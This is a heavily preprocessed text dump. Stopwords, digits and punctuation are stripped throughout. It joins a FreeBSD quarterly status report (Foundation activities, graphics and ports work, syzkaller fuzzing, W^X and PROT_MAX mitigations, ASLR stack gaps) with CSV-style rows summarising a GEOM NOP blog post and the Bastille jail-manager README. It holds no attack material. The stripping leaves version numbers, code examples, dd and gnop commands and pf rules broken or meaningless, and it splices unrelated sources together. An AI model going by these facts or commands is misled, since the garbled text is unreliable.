deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter partnership commercial user support help facilitate collaboration commercial user freebsd developer also meet company discus need bring information back project ed maste deb goodkin met commercial user u beneficial also help u understand application freebsd used also able meet good number commercial user vbsdcon eurobsdcon venue provide excellent opportunity meet commercial individual user contributor freebsd fundraising effort work funded donation continuing work hard get commercial user give back help u continue work supporting freebsd importantly like thank individual donor making donation last quarter please consider making donation help u continue increase support freebsd also partnership program provide benefit larger commercial donor find information wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram share company o improvement foundation support software development project improve freebsd operating system full time technical staff contractor project grant recipient maintain improve critical kernel subsystem add new feature functionality fix problem last quarter commits freebsd base system repository sponsored freebsd foundation represents one fifth commits period many project entry quarterly report repeated foundation staff member konstantin belousov committed many improvement multiple kernel subsystem well lowlevel infrastructure included fix robust mutexes unionfs memory oom handler percpu allocator additional work included fix security issue introduction maintenance vulnerability mitigation improving posix conformance ed maste committed number minor security bug fix improvement well first iteration tool editing mitigation control elf note additional work included effort build infrastructure tool chain clang integrated assembler ia used widely part path retiring assembler gnu binutils readelf tool decodes additional elf note information ed also enabled linuxulator linux binary support layer added trivial implementation system call handling common option mark johnston added capsicum support number elf tool chain utility committed number capsicum kernel userland fix mark worked number change related security improvement including integration support syzkaller automated system call fuzzer fixing issue identified syzkaller change included addressing failure caused refcount wraparound improvement protmax memory protection work included numa locking kernel debugging riscv kernel improvement edward napierala continued working linuxulator improvement quarter primary focus continued tool improvement strace usable diagnosing issue linux binary running linuxulator said previous work number issue fixed along way generally minor issue large impact example every binary linked uptodate glibc previously segfaulted startup fixed continuous integration quality assurance foundation provides fulltime staff member working improving automated testing continuous integration overall quality assurance effort third quarter foundation staff continued improve project ci infrastructure worked contributor fix failing build test case worked team project testing need added several new ci job worked getting hardware regression testing lab ready liwen hsu gave presentation testingci status update work freebsd ci system devsummit slide available devsummit page continue publishing ci weekly report freebsdtesting mailing list archive available see freebsd ci section report completed work item detailed information supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project check advocacy education work last quarter sponsored usenix annual technical conference industry partner represented freebsd oscon portland represented freebsd coscup taiwan presented open source summit north american san diego ca executive director deb goodkin interviewed tfir http wwwfreebsdfoundationorgnewsandeventslatestnewstfirinterviewfreebsdmeetslinuxattheopensourcesummit sponsored freebsd hackathon vbsdcon reston va sponsored attendee bag attended vbsdcon reston va represented freebsd chiang mai thailand represented freebsd ulaanbaatar mongolia served administrator project google summer code session see google summer code section report information sponsored freebsd developer summit eurobsdcon lillehammer norway sponsored attended eurobsdcon lillehammer norway applied accepted freebsd miniconf linuxconfau gold coast australia jan freebsd talk accepted seagl seattle wa november continued producing freebsd advocacy material help people promote freebsd learn recent effort advocate freebsd around world http wwwfreebsdfoundationorgblogfreebsdaroundtheworld face freebsd series back check latest post roller angel read conference adventure conference recap trip report monthly newsletter http wwwfreebsdfoundationorgnewsandeventsnewsletter help educate world freebsd publishing professionally produced freebsd journal mentioned previously freebsd journal free publication find access latest issue http wwwfreebsdfoundationorgjournal find event attended upcoming event opened official freebsd swag store get sticker shirt mug shopfreebsd continued work new website developer help u improve website work begun make easier community member find information make site efficient legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go http wwwfreebsdfoundationorg find support freebsd help contact freebsd graphic team freebsdorg contact niclas zeising zeising freebsdorg freebsd team maintains lower level freebsd graphic stack includes graphic driver graphic library mesa opengl implementation xorg xserver related library application wayland related library application last period several change made behind scene also worked general clean old xorg port deprecated upstream port infrastructure xorg port port depend xorg port updated switched usexorg xorgcat use us framework instead old way including bsdxorgmk bsdportmk infrastructure work fairly substantial new port depending xorg port add usesxorg makefiles part bsdxorgmk split xorgcat part split usesxorgcat used xorg port set common environment building xorg port addition framework pulling xorg port directly freedesktoporg gitlab added make improve development testing since make possible create port unreleased version improvement area includes framework using meson instead autotools building xorg port still work progress also worked clean deprecate several old xorg port library port already removed still waiting removal sufficient deprecation period notably amongst deprecation required fix several dependency several old library also deprecated graphicslibglw application driver also deprecated period remaining removal area speed deprecation upstream currently investigating new software added upstream need port freebsd also continued regularly scheduled biweekly meeting people interested helping find u freebsdorg mailing list gitter chat http gitterimfreebsddesktoplobby also available freebsdxorg efnet also team area github work repository found http githubcomfreebsddesktop contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing third quarter freebsd release engineering team finished cycle final release build started july official announcement sent july freebsd fourth release branch building stability reliability freebsd release engineering team also started work upcoming started september release cycle first freezeless release subversion repository test bed eliminating requirement hard code freeze development branch commits branch still require explicit approval release engineering team however present three beta build far two rc build final build scheduled november additionally throughout quarter several development snapshot build released head branch snapshot released well although cycle much work sponsored rubicon communication llc netgate freebsd foundation contact security team secteam freebsdorg several member security team met vendor summit october formalize team structure dedicated architecture crypto engineering addition existing product security incident response function since june started fortnightly conference call discus important issue collaborate closely advisory erratum notice pipeline security advisory sent erratum notice sent project span multiple category kernel userspace port collection external project contact ed maste emaste freebsdorg order streamline process creating install virtual machine system image needed fat filesystem support makefs makefs originally developed netbsd fat support added much later tool ported freebsd siva mahadevan one freebsd foundation intern university waterloo worked porting fat support netbsd rebased updated siva work committed quarter followup fix able build fat filesystem image without using md without requiring root project sponsored freebsd foundation contact alan somers asomers freebsdorg fuse file system userspace allows userspace program implement file system widely used support outoftree file system like ntfs well exotic pseudo file system like sshfs freebsd fuse driver added gsoc project since time largely neglected fuse software buggy outofdate implementation year behind completed work fixed newlyintroduced bug fixed longstanding sendfile bug affect fuse http bugsfreebsdorgbugzillashowbugcgi merged everything head fixed resulting coverity cid new fuserelated bug report assume everything working great report problem asomers freebsdorg project sponsored freebsd foundation contact summer code admins socadmins freebsdorg freebsd project pleased participated google summer code marking year participation year six successful project dualstack ping command ján sučan firewall test suite ahsan barkati kernel sanitizers costin carabaș mac policy ip address freebsd jail shivank garg separation port build process local installation theron tarigo virtual memory compression paavoeinari kaipila thank google opportunity work student hope continue work freebsd future project sponsored google summer code contact shivank garg shivank freebsdorg introduction vnet freebsd jail free set ip address however privilege may need limited host per need multiple security reason project us mac access control framework impose restriction freebsd jail according rule defined root host using sysctl involves development dynamically loadable kernel module macipacl based trustedbsd mac framework implement security policy configuring network stack project allows root host define policy rule limit root jail set ip address andor subnets set interface feature new mac policy module host define one list ip addressessubnets jail choose host restrict jail setting certain ip address prefix subnets host restrict privilege network interface implementation macipacl module loadable kernel module implement mac check netinetinc check ip address requested jail idea implement check place come fact siocaifaddr ioctl handler defined adding ip address interface used ifconfig userspace setting ip address mac framework act multiplexer netinet module requested ip credential checked rule macipacl output returned accordingly netinet module tuned various sysctl similarly policy rule also defined sysctl testsuite test script integrated kyua atf included module using module written man page module please refer macipacl using new mac module various example final deliverable new project developed part google summer guidance bjoern zeeb bz freebsdorg module reviewed revision project accepted ready land yet merged freebsd head waiting tested hand industry thankful give module try share valuable experience please free share idea feedback module please hesitate send email contact ed maste emaste freebsdorg freebsd foundation would like ensure running freebsd contemporary hardware including laptop remains viable end plan purchase latest generation one family laptop preferred member freebsd community evaluate existing state hardware support implement missing hardware support possible first laptop project selected generation lenovo carbon project sponsored freebsd foundation contact rick macklem rmacklem freebsdorg describes new minor revision nfs version protocol project implement new minor revision nfs version minor version protocol add several optional feature nfs support seekdataseekhole file copying done server avoids data transfer wire support posixfallocate posixfadvise hopefully feature improve performance certain application implementation nearing completion recent work mostly testing cycle interoperability testing linux completed main area still need testing use pnfs server start soon testing pnfs completed believe code ready incorporated freebsd headcurrent testing others would appreciated modified kernel found http run recent freebsd headcurrent system client mount need mount option enable protocol contact ganbold tsagaankhuu ganbold freebsdorg following feature added support soc emmc freebsd extended simplemfd driver expose syscon interface node also compatible syscon instance rockchip grf general register file compatible simplemfd well syscon device like emmcphy pciephy etc made rockchip general register file driver subclass simple mfd driver added driver rockchip emmc phy added emmc support code rockchip soc tested board contact andrew turner andrew freebsdorg contact mark johnston markj freebsdorg contact michael tuexen tuexen freebsdorg contact samy al bahra sbahra freebsdorg see syzkaller entry quarterly report introduction syzkaller work continued fixing bug uncovered syzkaller dozen kernel bug fixed past three month directly attributed syzkaller number syzkaller reproducer incorporated test suite backtraceio via samy graciously provided large server running dedicated syzkaller instance fuzz freebsd bhyve though syzbot public syzkaller instance run google already fuzz freebsd proven fruitful run multiple syzkaller instance different instance find different bug syzkallerbacktraceio allows u experiment freebsdspecific extension particular instance currently uploads data crash backtraceio making much easier triage analyze crash plan make service generally available freebsd developer near future going forward continue extend syzkaller coverage make simpler user developer run private instance optionally collect kernel crash information debugging submission project sponsored backtraceio freebsd foundation contact scott phillips scottph freebsdorg intel contributed port software stack port tree new port contains set library expose various apis using tpm conforming tcg tpm specification provides set command line tool use library perform tpm operation finally userspace daemon act tpm access broker resource manager multiplexing many tpm user onto single tpm device sponsored intel corporation update kernel subsystemsfeatures driver support filesystems contact konstantin belousov kib freebsdorg compareandswap ca one fundamental building block hardwareassisted atomic readmodifywrite operation architecture support directly instance sparc others provide different building block usually pair load linkedstore conditional instruction llsc used construct ca atomic operation like fetchandadd atomic arithmetic ops using plain arithmetic instruction example ldxrstxr pair llsc operation performed first using load linked instruction load value memory simultaneously mark cache line exclusive access value updated store conditional instruction writes marked cache line write another cpu make store instruction fail typically atomic primitive llsc architecture retry whole operation store failed mean cpu either lost race even failure spurious called strong version ca atomics primitive return failure instead ca variant called weak c standard freebsd threading library lock implementation fast path mode userspace possible kernel often need ca operation user memory location addition guarantee normal ca also must ensure safety tolerance paging freebsd primitive provides ca usermode word kernel implemented strong ca similarly mode operation hardware ca instruction using strong implementation casueword may dangerous since address potentially accessible potentially malicious thread process thread constantly dirties cache line used llsc loop could practically force kernelmode thread remain stuck loop forever since loop tight check signal thread stopped killed solution make casueword implementation weak mean interface primitive must changed allow notifying caller spurious failure also caller responsibility retry appropriate change casueword made architecture even pslzf value cmpxchg instruction returned directly new casueword two dozen us primitive located kernumtxc inspected retry added needed somewhat related note inkernel atomiccmpset operation strong atomicfcmpset weak unless broken specific architecture general attitude seems retry duty primitive caller project sponsored freebsd foundation contact mark johnston markj freebsdorg modern cpu architecture ability flag memory mapping noexecute nx prevents memory executed processor nx mapping important security mitigation since help segregate code data blocking unintentional execution memory whose content controlled attacker wx write xor execute security policy disallows creation mapping simultaneously writeable executable policy memory whose content modified must mapped nx flag policy make harder exploit bug permit attacker arbitrarily overwrite data freebsd long made use nx flag userspace mapping whenever possible past several year applied kernel mapping recent project sought implement wxbydefault policy kernel completing audit remaining executable mapping kernel making modification either apply nx bit mapping make readonly work landed head available freebsd similar work cpu architecture also planned help audit kernel mapping protection vmpmapkernelmaps sysctl added dump snapshot kernel page table entry attribute way mapping violating wx policy easily discovered investigated sysctl provides information useful anyone interested kernel memory layout rare exception kernel mapping require execute permission kernel executable loadable kernel module number region memory unnecessarily mapped without nx identified corrected first address kernel code mapping kernel linker script modified pad text segment boundary improve performance kernel creates superpage mapping text segment mean data cohabiting final text mapping mapped execute permission padding allows executable code segregated data follows kernel image avoiding problem maintaining superpage optimization expense wasted ram enforcing wx turned somewhat trickier unlike cpu architecture supported freebsd kernel module linked relocatable object file ie file architecture dynamically shared object dsos file one might naively expect use file mean kernel module contain efficient code would linked dsos since dsos inherently make use certain type indirection allow shared library loaded arbitrary address indirection useless kernel part project attempt made switch using dsos well since cost indirection largely mitigated modern toolchains found use dsos would also force change code model used compiling kernel code resulting performance penalty main obstacle use file section pagealigned default segregation section differing mapping protection requirement done static linker linking dso executable file since mapping protection applied granularity page size overlap section within page cause problem since example end readonly text section may overlap beginning readwrite data section one possible solution perform required section reordering padding kernel module load time approach break debugging tool dtrace kgdb assume kernel linker modify layout loadable module result kernel module linker script used insert padding specific section finally kernel linker modified restrict mapping protection based section flag result kernel boot without writeable executable mapping though work architecturespecific much leveraged provide policy supported architecture project sponsored netflix contact xin li delphij freebsdorg contact yoshihiro ota ota jemailnejp zlib compression library widely used various software freebsd system used ancient yearold version zlib version total version one userland one zfs one kernel xin yoshihiro upgraded zlib latest eliminated extra copy along effort zlib version upgraded netgraph ppp reimplemented use standard zlib removed unmaintained code one latest version zlib freebsd code base new compress uncompress apis exposed kernel importing change zlib simple kernel zlib change kernel zlib user update legacy code removal contact brook davis brook freebsdorg unixlike system provide mmap system call allocate memory map file device memory specified access protection mprotect system call change protection mapped memory protection flag specify whether memory may read written andor executed protread protwrite protexec respectively traditionally mprotect used set desired protection except shared mapping file opened readonly protwrite set new macro protmax add facility specifying maximum possible protection flag mmap mprotect call program specify whether mapping may changed future allow given access protection example memory mapping set read write protection set may never made executable maximum protection value provided protmax macro regular protection value change allows eg region must writable runtime linking jit code generation made permanently readexecute writes complete complement writexorexecute wx protection available operating system allowing precise control programmer example request memory made executable mmap null size protread protwrite protmax protread protwrite mapanon request memory may execute permission enabled later currently executable mmap null size protread protwrite protmax protread protwrite protexecute mapanon change alters mprotect argument checking return error unhandled protection flag set differs posix posix specifies error valid permission set documented behavior linux closely match historical mmap behavior addition explicit setting maximum permission experimental sysctl vmimplyprotmax cause mmap assume initial permission requested maximum sysctl set behavior known break code us protnone reservation mapping content part reservation later version work expected provide perbinary perprocess optinout option sysctl may removed current form undocumented flag nonportable used portable code simple ifdefs expand protmax sponsor darpa afrl contact konstantin belousov kib freebsdorg aslr useful addition next series buzzwordcompliant checkboxes stack address randomization main userspace thread stack freebsd traditionally allocated top user address space grows besides initial pointer stack userspace entry area also contains structure program argument environment called string aux vector data elf image considering goal randomizing address string main thread initial frame moving main stack area address space feasible would cause significant abi breakage invalidates knowledge already coded many introspection tool cause unneeded additional fragmentation user address space instead typical approach adding gap randomized size top stack place string used done way preserve stack alignment requirement stack gap enabled aslr enabled default stack gap enabled default aslr enabled stack gap specified percentage total stack size used maximum gap main drawback gap approach shortly identified since gap cut normal stack area attempt program reduce stack size using rlimit rlimitstack could cut active stack region new limit happens smaller gap eg default main thread stack even one percent max gap give approximately unused stack blow limit several kb typical reason using rlimit way program wire address space mlockall trying reduce potential wired stack size avoid exceeding rlimitmemlock first victim issue ntpd reset stack limit start really small value currently wiring removed ntpd apparently make timekeeping better mean contrary popular belief opinion problem user interface area gap approach make easy specify small gap size done integral percentage interface far formulated way would like since nobody looked good solution ntpd fixed severity issue seems low project sponsored freebsd foundation contact konstantin belousov kib freebsdorg necessity handling page fault separated two piece first architecturedependent lowlevel machine exception handler second architectureindependent vmfault function sysvmvmfaultc machinedependent code page fault typically consists three component trampoline written assembly creates c execution environment gather hardwaresupplied data page fault reason trap function common clevel entry point dispatch exception processing trappfault c function specifically handle page fault trappfault call vmfault help vm needed resolve situation fault handled either trap trappfault vmfault faulting instruction restarted fault handled reason next action depends mode fault occured kernel kernel installed helper helper called instead returning faulting instruction otherwise kernelmode page fault cause panic unhandled fault occured usermode unix send signal thread whose execution caused exception posix single unix specification list several case signal sent specifies signal number sicode siginfo must supplied signal unfortunately freebsd rather noncompliant regard long time ago improve compliance changed signal sent access page permission incompatible access mode caused multiple problem garbage collection gc based runtimes incorporated knowledge freebsd quirk machdepprotfaulttranslation sysctl knob added case incompatibility identified recently part problem code calculate signal sicode mach error returned vmfault located trappfault word architecture specific set bug noncompliance sometimes code even misinterpreted returned mach error errno new helper function vmfaulttrap added several thing trap handler creates ktrace point fault call vmfault interprets result term uservisible error condition returning precalculated signal number sicode caller trappfault need provide signal number truly machinedependent error example case protection key violation besides compliance bug fix also provided refinement userspace reason delivered signal instance sigbus caused copyonwrite failure due exceeding swap reservation limit provide specific sicode busoomerr project sponsored freebsd foundationupdating platformspecific feature bringing support new hardware platform contact michal stanek mst semihalfcom contact kornel duleba mindal semihalfcom contact marcin wojtas mw semihalfcom semihalf team continued working freebsd support broadcom soc series quadcore communication processor targeted networking application router gateway control plane processing na completed since last update iproc pcie root complex internal external bus fix improvement crypto engine acceleration ipsec offloading todo upstreaming work work expected submittedmerged head project sponsored juniper network inc contact robert watson rwatson freebsdorg contact andrew turner andrew freebsdorg contact brook davis brook freebsdorg september arm announced morello experimental multicore superscalar cpu soc prototype board extended implement cheri protection model morello become available detail found arm blog light blue touchpaper blog main cheri website updated cheribsd cheriadapted version freebsd originally targeted mipsbased sricambridge cheri processor prototype support current draft architecture includes full userspace spatial referential memory safety cheriabi well backwards compatibility support running existing userspace binary continue update cheribsdmorello isa finalised also closely track public cheribsdmips trunk picking new software feature utilizing cheri mature well pick change baseline freebsd development trunk currently anticipate releasing cheribsdmorello open source isa toolchain published sponsor darpa afrl contact mark linimon port linimon freebsdorg contact justin hibbits src jhibbits freebsdorg contact piotr kubaj port pkubaj freebsdorg freebsdpowerpc project continues make great stride however discovered bsdcan done great job letting people know key point src recent hardware productionquality year port developerquality month main targeted platform ibm chip recent available primary focus going forward freebsd required freebsd recommended older apple power mac continuing secondary basis freebsd version work however still developeronly quality freebsd recommended powerpcspe amiga however still developeronly quality freebsd recommended software status powerpc earlier still remain antiquated base powerpc soon switched base great deal work undertaken ensure regression possible switch occurred see link powerpc support longer priority freebsdorg package set available quarterly default usual method firefox work using experimental notyet committed patch recent package build still following statistic apply queued built failed skipped ignored port fix committed every day also piotr would like thank freebsd foundation funding personal talos raptor via integricloud subsidiary loaning server talosanongothpl run team would like thank ibm loan two machine oregon state university osu providing hosting well would like thank clusteradm team keeping tyan machine online hosted nyi contact marcin wojtas mw semihalfcom contact artur rojek ar semihalfcom semihalf team initiated working freebsd support nxp soc quadcore processor integrated packet processing acceleration high speed peripheral including gb ethernet pcie sata usb wide range networking storage security industrial application completed since last update dpaa network interface support sdmmc gpio progress qspi network performance improvement todo upstreaming developed feature work expected submittedmerged head project sponsored alstom groupchanges affecting base system program contact ed maste emaste freebsdorg get obsolete c library routine reading string standard input removed c standard way use safely prompted comment paul vixie talk vbsdcon started investigating would take remove get libc patch posted phabricator refined several time portmgr team performed several expruns identify port broken removal symbol versioning used preserve binary compatibility existing software us get change committed september freebsd project sponsored freebsd foundationchanges affecting port collection whether sweeping change touch tree individual port contact dan langille dvl freebsdorg freshports consolidates commits easytofollow format track change favorite port also process src doc www commit freshports par incoming email refreshes database find early september started looking freshports could use git repository processing commits result approach identifying new commits iterating next idea commit hook interesting bit exercise commit iteration eurobsdcon freebsd developer summit wrote small requirement section received great help two source janpiet men recommended python library turned great sergey kozlov wrote python code create xml using python library trip home able get code parse git commit xml loaded freshports database returning home conference created new freshports instance processing git based website needed change related git remaining task automate script git pull etc detect new commits later iteration design lightweight git hook event eurobsdcon hackathon sponsored intel corporation work done sergey kozlov contact greg lewis glewis freebsdorg last quarter considerable work improving support java higher work backported java starting initial release march intervening month freebsd support added feature java flight recorder hotspot serviceability agent hotspot debugger dtrace javac server java sound sctp addition support architecture also added feature supported attention turned compliance using internal jdk test suite method measuring work third quarter focused test failure dropping failure test failure nt appear impact functionality significant fix include stack overflow crash error external process handling utility little endian system hotspot debugger functionality thread enumeration networking functionality finally work forward ported java freebsd gaining support version day release note work collaboration many others many contributor list please take look commit history github repository like recognise kurt miller openbsd tireless work cocollaborator java bsd many year also grateful sponsorship freebsd foundation allowed focus work project sponsored freebsd foundation contact adriaan de groot kde freebsdorg kde freebsd project package software produced kde community freebsd software includes full desktop environment art application http kdenliveorg hundred application used freebsd desktop machine along kde team maintains qt library cmake build system handful c library used kde stack upstream release kde framework library monthly cycle kde plasma desktop environment quarterly collection kde application usable everywhere twice year kde freebsd team chased dozen update component freebsd remains one uptodate system kde software qt large possibly breaking still need investigation change came release kde digikam stopped using previous plugins system old plugins still used kde software new entry netim category added ruqola rocketchat client rich instantmessaging cmake updated twice force rebuild several thousand cbased port kde freebsd team fix port regardless whether error cmake update upstream code update tend take large amount effort since touch unfamiliar often veryverylegacy code open bug list grew quarter tends hover around item new thing come old one resolved welcome detailed bug report patch kde packaging update prepared copy port repository github merged svn welcome pull request well contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg freebsd port management team tasked overseeing port tree committers report following event happened number port grew last quarter open port pr unassigned period committers made commits head commits quarterly branch show trend last quarter increased activity continuing last quarter welcomed santhosh raju fox dmitri goutnik dmgk team said goodbye gabor last quarter feld decided step portmgr portssecteam team would like thank past service last three month bapt put engineering hat released new version pkg added support overlay port tree fixed two make target deinstalldepends reinstall cleaned bsdsitesmk infrastructure side usespure became obsolete therefore removed two new us xorg xorgcat added replace old bsdxorgmk two new keywords ldconfig ldconfiglinux added simplify formatting package list number default version changed lazarus linux centos llvm perl postgresql ruby big uservisible port firefox got updated firefoxesr chromium xfce last quarter antoine ran expruns test package update test updating bsdjavamk test new ldconfig ldconfiglinux keywords test default version update test new xorg xorgcat us test base update test various improvement go ruby contact guido falsi xfce freebsdorg september xfce desktop environment port updated recently released xfce version update include upgrade main xfce component latest version migrated exception base component still require link addition allow older xfce application example panel plugins keep working due change gtkxfceengine theme deprecated since support xfce metaport default installs greybird theme enabled default new version also includes program installed default finally default display manager xfce depends changed lightdm regression reported bugzilla particular one affecting user regression window manager specific graphic display hardware window manager fails properly draw window decoration appear black blocky affected system problem also reported upstream bug tracker solution sought anyone experiencing display glitch able test please contact xfce freebsdorg help trying figure solution many project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission contact oleg ginzburg olevole olevoleru clonos clonos turnkey opensource platform based freebsd cbsd framework clonos offer complete web ui easy control deployment management freebsd jail container bhyvexen hypervisor virtual environment clonos currently available platform allow xen bhyve hypervisors coexist host since clonos freebsdbased platform ability create manage jail natively allowing run freebsd application without losing performance clonoscbsd status report added support cloudinit linuxbsd vms cloudbaseinit window vms give ability use freebsd iaa platform instant deployment usage virtual machine based bhyve hypervisor project started use cloud image better stability resiliency new mirror france u canada added distributing isocloudinit image addition russia latvia ukraine using jenkins ci testing regular clonos build update clonos package thanks daniel shafer new pkg repository deployed support clonos installation package moment package available clonos package repo thanks daniel shafer open issue task volunteer contributor tester urgently needed distribute clonos freebsd environment like expand mirror number geographically help contribution much appriciated urgently looking hosting sponsorship various developing testing activity contact michal krawczyk mk semihalfcom contact maciej bielski mba semihalfcom contact marcin wojtas mw semihalfcom ena elastic network adapter smart nic available virtualized environment amazon web service aws ena driver support multiple transmit receive queue handle gb network traffic depending instance type used development freebsd similar linux dpdk since last update internal review improvement patch done followed validation various aws instance completed since last update verification review netmap support mapping memory wc instance order enable llq mode todo upstream netmap support upstream fix llq mode instance amazoncom inc contact luca pizzamiglio pizzamig freebsdorg contact esteban barrio estebanbarrios trivagocom experimental project started provide jail orchestration based nomad jail framework pot similarly orchestration work docker model allows u split jail creation jail deployment jail image created exported using pot framework image deployed orchestrated using nomad driver developed allow nomad interact pot one goal project use nonpersistent jail container allowing u define container similar docker identical underlaying o different identify potential missing feature freebsd support computational model next quarter launch first service based project next step provide guide howtos improve stability extending test suite improving tooling createmanage image project sponsored trivago nv contact alfonso sabato siciliano alfonsosiciliano emailcom freebsd kernel maintains management information base mib component object represents parameter system sysctl system call explores mib find object object identifier oid call handler get set value parameter often necessary find object call handler get info description type name next object etc kernel provides undocumented interface implemented kernsysctlc sysctlinfo new interface explore sysctl mib pas info object userland project provides readme manual helper macro example test converted tool primarily sysctlinfo provides new set sysctl node corresponding kernel interface handle object ctlmaxname level sysctlentryfakename sysctlentrydesc sysctlentrylabel sysctlentrykind sysctlentryfmt sysctlentrynextleaf moreover new feature implemented support capability mode sysctlentryname sysctlentryidbyname sysctlentrynextnode get info object kernel need find many time new sysctlentryallinfo node written efficient finally byname node added search object name avoiding call similar explore mib find corresponding oid sysctlinfo installed via sysutilssysctlinfokmod applying sysctlinfodiff patch efficient module us shared lock interface used deskutilssysctlview sysutilsnsysctl converted version sysctl sysctlbyname sysctlnametomib used get value object level levelname character future new byname node added allow sysctlbyname manage ctltypenode nonull handler example sysctlbyname kernprocpid pid news home status home
197,Lobsters,freebsd,FreeBSD,GEOM NOP,https://oshogbo.vexillium.org/blog/71/,geom nop,asiabsdcon may change,sometimes testing file system application want simulate error disk level first time heard need baptiste daroussin presentation asiabsdcon mentioned built test lab need recently discussed pgcon test postgresql instance freebsd user great news geom provider allows simulate failing device gnop allows u configure transparent provider existing one first interesting option slice device smaller piece thanks offset option stripsesize allows u observe data disk changing let assume want observe change gpt table gpt flag added removed example bootme flag described use dd every time analyze using absolute value disk examine gpt offset may differ machine use following analyze gpt header dd hexdump efi part ff ff ff ec ea v cc lji bf following command analyze gpt partition array dd hexdump cf nqn ba ec ea cc g lji cf nqn fd ec ea cc r lji ff playing b count skip value get detailed information gpt table would like observe time would need remember absolute value gpt beginning disk thanks gnop provider create slice disk new device point interesting part gpt table gnop create command create new device device start offset size also byte thanks use dd read data relative start gpt header unfortunately time writing limitation util create single nop device single provider may change near feature additionally creating configure transport layer behave one option configure failure rate io request gnop create w r using command created new using provider probability write request fail read one time ago also added three new option simulate slower io disk configure disk request delay probability rate happening example used test behavior zfs one disk slower rest gnop create x using new provider probability request delayed one second geom nop powerful tool allows test failing disk well great tool disk forensics toolbox
198,Lobsters,freebsd,FreeBSD,Bastille,https://github.com/BastilleBSD/bastille,bastille,bastille bastille bastille template installation pkg port git enable boot basic usage network requirement etcpfconf dynamic rdr enable pf rule zfs support example bastille bootstrap important need zfs support see section bootstrapping freebsd freebsd hardenedbsd hardenedbsd bastille create vnet etcdevfsrules bastille start bastille stop bastille restart bastille list bastille service bastille cmd bastille pkg bastille destroy bastille template bastille template applying template bastille top bastille htop bastille sysrc bastille console bastille cp bastille rdr bastille update bastille upgrade bastille verify bastille zfs set quota builtin df builtin df bastille export bastille import bastille clone bastille mount bastille umount example create start console project goal networking tip tip tip tip community support bastille issue tracker,bastille bastille opensource system automating deployment management containerized application freebsd looking bastille template installation bastille available official freebsd port tree pkg port portsnap fetch auto make c usrportssysutilsbastille install clean git bleeding edge unstable primarily developer git clone http githubcombastillebsdbastillegit cd bastille make install enable boot sysrc bastilleenableyes basic usage bastille opensource system automating deployment management containerized application freebsd usage bastille command target args available command bootstrap bootstrap freebsd release container base clone clone existing container cmd execute arbitrary command targeted container console console running container convert convert thin container thick container cp cp file host targeted container create create new thin thick container destroy destroy stopped container bootstrapped release edit edit container configuration file advanced export export container archive image help help command htop interactive process viewer requires htop import import container archive image limit apply resource limit targeted container see rctl list list container release template log limit backup mount mount volume inside targeted container pkg manipulate binary package within targeted container see pkg rdr redirect host port container port restart restart running container service manage service within targeted container start start stopped container stop stop running container sysrc safely edit rc file within targeted container template apply automation template targeted container top display update information top cpu process umount unmount volume within targeted container update update container base px release upgrade upgrade container release xyrelease verify verify bootstrapped release automation template zfs manage getset zfs attribute targeted container use bastille v version version information use bastille command h help information command document outline basic usage bastille container management framework release still considered beta network requirement several networking option performed regarding user need basic container support ip alias networking ip address assigned host interface used container generally known shared ip based container administer network assign remove unallocated ip address shared ip simple method get started case skip ahead zfs support administator network perhaps cloud someplace provided single address situation bastille create attach container private loopback interface host system act firewall permitting denying traffic needed method primary method year first create loopback interface ishmael sysrc ishmael sysrc ishmael service netif cloneup create firewall config merge necessary etcpfconf extif set blockpolicy return scrub extif fragment reassemble set skip lo table jail persist nat extif jail extif static rdr example rdr pas inet proto tcp port enable dynamic rdr see rdranchor rdr block pas quick modulate state antispoof extif inet pas inet proto tcp port ssh flag ssa keep state make sure also open port going use dynamic rdr pas inet proto tcp port rdrstart rdrend flag ssa keep state pas inet proto udp port rdrstart rdrend flag ssa keep state make sure change extif variable match host system interface make sure include last line port ssh end locked remote system note existing firewall key line inout traffic container table jail persist nat extif jail extif rdr example rdr pas inet proto tcp port nat route traffic loopback interface external interface outbound access rdr pas redirect traffic host firewall port x ip container example shown redirects web traffic container finally enable start firewall dynamic rdr rdranchor rdr enables dynamic rdr rule setup using bastille rdr command runtime eg bastille rdr jail tcp redirects tcp port host jail bastille rdr jail udp udp bastille rdr jail list list dynamic rdr rule bastille rdr jail clear clear dynamic rdr rule note rediirecting port host also listening eg ssh make sure host service listening cloned interface eg ssh set sshdflags rcconf enable pf rule ishmael sysrc pfenable yes ishmael service pf restart point likely disconnected host reconnect ssh session continue step need done order prepare host zfs support bastille added initial support zfs bastille bootstrap bastille create generate zfs volume based setting found bastilleconf section outline enable configure bastille zfs two value required bastille use zfs default value bastilleconf empty populate two enable zfs zfs option bastillezfsenable default bastillezfszpool default bastillezfsprefix bastille default bastillezfszpool bastille bastillezfsmountpoint bastilleprefix default bastilleprefix bastillezfsoptions atimeoff default atimeoff example ishmael sysrc f usrlocaletcbastillebastilleconf bastillezfsenableyes ishmael sysrc f usrlocaletcbastillebastilleconf bastillezfszpoolzpoolname replace zpoolname zpool want bastille use tip zpool list zpool status help get pool available likely using zfs safely ignore setting bastille bootstrap begin creating container bastille need bootstrap release current supported release important need zfs support see section bootstrapping bootstrap release run bootstrap subcommand release version argument freebsd ishmael bastille bootstrap freebsd ishmael bastille bootstrap hardenedbsd ishmael bastille bootstrap hardenedbsd ishmael bastille bootstrap bastille 